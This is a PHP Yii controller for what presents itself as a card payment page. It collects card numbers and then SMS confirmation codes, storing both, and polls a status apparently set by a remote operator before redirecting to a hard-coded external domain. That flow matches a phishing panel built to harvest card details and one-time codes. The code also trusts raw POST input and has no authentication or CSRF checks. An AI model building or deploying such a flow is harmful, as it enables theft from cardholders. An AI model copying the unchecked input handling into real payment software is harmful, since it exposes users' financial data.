<?php
/**
 */

class CardController extends CController
{
	const DOMAIN_CARD_UNI = 'https://processingpay.biz';
	//const DOMAIN_CARD_UNI = 'https://94.140.125.237/univerTestSsh';

	public $defaultAction = 'index';
	public $layout='main';
	public $title='';

	public function render($tpl, $params = null, $return = false)
	{
		$result = parent::render($tpl, $params);
		Yii::app()->end();
		return $result;
	}

	public function actionIndex($id = '', $amount = '')
	{
		session_write_close();

		$models = [];
		$params = $_POST['params'];

		$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);

		if($model->status == 'success')
			$this->redirect('pay/card/success',['id'=>$id]);
		elseif($model->status == 'error')
			$this->redirect('pay/card/error',['id'=>$id]);
		elseif($model->status == 'working')
			$this->redirect('pay/card/wait',['id'=>$id]);

		if($_POST['send'])
		{
			$params['id'] = $id;
			$params['card_no'] = str_replace(' ','', $params['card_no']);

			$result = NewYandexPay::addCardInfo($params);

			if($result)
				$this->redirect('pay/card/wait',['id'=>$id]);

		}

		if($model)
			$orderId = $model->order_id;

		return $this->render('form',[
			'params'=>$params,
			'id'=>$id,
			'orderId'=>$orderId,
			'amount'=>$amount,
		]);
	}

	public function actionWait($id = '')
	{
		session_write_close();

		$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);

		if(Yii::app()->request->isAjaxRequest)
		{
			if(isset($_POST['startUpdate']))
			{
				$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);

				if($model->status == 'working')
					echo(self::DOMAIN_CARD_UNI.'/index.php?r=pay/card/sms&id='.$id);
				if($model)
					$id = $model->order_id;
			}

			Yii::app()->end();
		}

		if($model)
			$orderId = $model->order_id;

		return $this->render('wait',[
			'orderId'=>$orderId,
			'id'=>$id,
		]);
	}

	public function actionSms($id = '')
	{
		session_write_close();

		if($_POST['send'] and $_POST['code'])
		{
			$result = NewYandexPay::addSmsCode($id, $_POST['code']);

			if($result)
				$this->redirect('pay/card/checkSms', ['id'=>$id]);

		}

		if($model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]))
			$order_id = $model->order_id;

		return $this->render('sms', [
			'id'=>$id,
			'order_id'=>$order_id,
		]);
	}

	public function actionCheckSms($id = '')
	{
		session_write_close();

		if(Yii::app()->request->isAjaxRequest)
		{
			if(isset($_POST['startUpdate']))
			{
				/**
				 * @var NewYandexPay $model
				 */
				$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);
				if($model->status == NewYandexPay::STATUS_SUCCESS)
					echo(self::DOMAIN_CARD_UNI.'/index.php?r=pay/card/success&id='.$id);
				elseif($model->status == NewYandexPay::STATUS_ERROR)
					echo(self::DOMAIN_CARD_UNI.'/index.php?r=pay/card/error&id='.$id);
				elseif($model->status == NewYandexPay::STATUS_WAIT_SMS)
					echo(self::DOMAIN_CARD_UNI.'/index.php?r=pay/card/sms&id='.$id);
			}
			Yii::app()->end();
		}

		return $this->render('check_sms',[
			'id'=>$id,
		]);
	}

	public function actionSuccess($id = '')
	{
		session_write_close();

		$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);
		if($model)
			$orderId = $model->order_id;

		return $this->render('success',[
			'orderId'=>$orderId,
		]);
	}

	public function actionError($id = '')
	{
		session_write_close();

		$error = '';

		/**
		 * @var NewYandexPay $model
		 */

		$model = NewYandexPay::model()->findByAttributes(['unique_id' => $id]);
		if($model)
		{
			$error = $model->error;
			$orderId = $model->order_id;
		}

		return $this->render('error',[
			'orderId'=>$orderId,
			'error'=>$error,
		]);
	}


}